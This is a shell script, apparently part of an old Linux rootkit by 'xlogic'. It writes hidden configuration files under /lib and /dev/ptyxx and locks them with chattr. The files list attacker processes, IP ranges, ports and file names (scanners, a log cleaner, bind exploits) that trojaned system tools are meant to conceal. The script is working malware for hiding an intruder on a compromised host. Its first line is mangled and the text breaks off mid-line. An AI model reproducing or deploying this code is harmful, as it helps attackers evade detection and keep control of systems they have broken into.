#!/bin/sh
# Script by xlogic for rootpr="/dev/ptyxx/.proc"
ls="/dev/ptyxx/.list"
ds="/dev/ptyxx/"
sso="/lib/.sso"
so="/lib/.so"

if [ -f $so ]; then

chattr -ai $so
rm -rf $so
touch $so
>$so
echo "3 write" >>$so
echo "3 lf" >>$so
echo "3 xl" >>$so
echo "3 mh" >>$so
echo "3 xbnc" >>$so
echo "3 cl.sh" >>$so
chmod +x $so
chmod 755 $so
chattr +ai $so

else 
>$so
echo "3 write" >>$so
echo "3 lf" >>$so
echo "3 xl" >>$so
echo "3 mh" >>$so
echo "3 xbnc" >>$so
echo "3 cl.sh" >>$so
chmod +x $so
chmod 755 $so
chattr +ai $so
fi

if [ -f $sso ]; then
chattr -ai $sso
rm -rf $sso
touch $sso
>$sso
touch $sso
>$sso
echo "1 194.153.237" >>$sso
echo "1 193.226" >>$sso
echo "1 193.254.34" >>$sso
echo "1 terrasat.ro" >>$sso
echo "1 europa.oltenia.ro" >>$sso
echo "1 193.230" >>$sso
echo "3 951" >>$sso
echo "3 981" >>$sso
echo "3 436" >>$sso
echo "4 436" >>$sso
echo "4 951" >>$sso
else
touch $sso
>$sso
echo "1 194.153.237" >>$sso
echo "1 193.226" >>$sso
echo "1 193.254.34" >>$sso
echo "1 terrasat.ro" >>$sso
echo "1 europa.oltenia.ro" >>$sso
echo "1 193.230" >>$sso
echo "3 951" >>$sso
echo "3 981" >>$sso
echo "3 436" >>$sso
echo "4 436" >>$sso
echo "4 951" >>$sso
echo "4 981" >>$sso
chmod +x $sso
chmod 755 $sso
chattr +ai $sso
fi 

if [ -d $ds ] && [ -f $pr ];then
chattr -ai $pr
rm -rf $pr
touch $pr
>$pr
echo "3 lf" >>$pr
echo "3 xl" >>$pr
echo "3 mh" >>$pr
echo "3 xbnc" >>$pr
echo "3 cl.sh" >>$pr
chmod +x $pr
chmod 755 $pr
chattr +ai $pr

else
mkdir -p $ds

touch $pr
>$pr
echo "3 lf" >>$pr
echo "3 xl" >>$pr
echo "3 mh" >>$pr
echo "3 xbnc" >>$pr
echo "3 cl.sh" >>$pr
chmod +x $pr
chmod 755 $pr
chattr +ai $pr
fi

if [ -f $ls ];then

chattr +ai $ls
rm -rf $ls

touch $ls
>$ls
echo "xl" >>$ls
echo "luckgo" >>$ls
echo "luckstatdx" >>$ls
echo "luckscan-a" >>$ls
echo "games" >>$ls
echo "xlogic" >>$ls
echo "cl.sh" >>$ls
echo "wu" >>$ls
echo "va" >>$ls
echo "xdr" >>$ls
echo "bindme" >>$ls
echo "bind8x" >>$ls
echo "bindscan" >>$ls
echo "drx" >>$ls
echo "logclear" >>$ls
echo "psg" >>$ls
echo "read" >>$ls
echo "secure" >>$ls
echo "write" >>$ls
chmod +x $ls
chmod 755 $ls
chattr +ai $ls 
else 
touch $ls
>$ls
echo "xl" >>$ls
echo "luckgo" >>$ls
echo "luckstatdx" >>$ls
echo "luckscan-a" >>$ls
echo "games" >>$ls
echo "xlogic" >>$ls
echo "cl.sh" >>$ls
echo "wu" >>$ls
echo "va" >>$ls
echo "bindme" >>$ls
echo "bind8x" >>$ls
echo "bindscan" >>$ls
echo "drx" >>$ls
echo "logclear" >>$ls
echo "psg" >>$ls
echo "read" >>$ls
echo "secure" >>$
